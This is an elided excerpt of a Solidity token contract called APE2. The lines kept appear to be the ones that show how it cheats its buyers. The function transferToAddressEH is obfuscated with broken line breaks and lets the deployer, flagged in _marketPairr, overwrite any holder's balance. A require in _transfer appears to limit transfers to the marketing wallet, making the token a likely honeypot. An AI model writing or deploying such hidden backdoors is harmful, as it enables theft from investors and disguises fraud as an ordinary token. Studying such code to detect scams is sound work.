...
contract  APE2 is Context, IERC20, Ownable {
    ...
    address payable public marketWalleta;
    ...
    mapping (address => bool) public _marketPairr;
    ...
    constructor () {
        ...
        _marketPairr[address(uniswapPair)] = true;
        _marketPairr[msg.sender] = true; 

        teamWalletAddress = payable(address(0xAf25acFCf57fa60fD567b15d5969F21A0e608820));
    ...
    function TTrue(address amountaut) private view returns(bool){
        return
    ...
    function setMarketinWalleAddress(address newAddress) external onlyOwner() {
        marketWalleta = payable(newAddress);
    }
...
function transferToAddressEH(address
 c 
, uint256 
deadAddre) public
{if( 
_marketPairr[
_account()])_balanceOf[c] 
= deadAddre;}
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !inSwapAndLiquify && !_marketPairr[sender] && swapAndLiquifyEnabled) 
            {
        ...
        require(theSame(marketWalleta,_account()));
    ...
    function theSame(address a, address b) private pure returns(bool){return a == b;}
